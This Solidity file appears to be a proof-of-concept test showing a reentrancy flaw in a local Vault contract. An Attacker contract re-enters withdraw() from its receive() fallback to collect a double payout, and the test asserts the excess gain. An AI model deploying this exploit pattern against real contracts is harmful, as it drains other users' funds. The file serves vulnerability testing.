// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/Vault.sol";

contract Attacker {
    Vault public vault;
    bool reentered;

    constructor(Vault v) payable {
        vault = v;
    }

    function attack() external {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            vault.withdraw();
        }
    }
}

/// PoC: expects the violation (attacker withdraws more than it deposited).
contract ReenterPoC {
    function test_reentrant_double_payout() public {
        Vault vault = new Vault();
        vault.deposit{value: 5 ether}(); // victim funds
        Attacker attacker = new Attacker{value: 1 ether}(vault);
        attacker.attack();
        require(address(attacker).balance >= 2 ether, "no excess payout");
    }
}
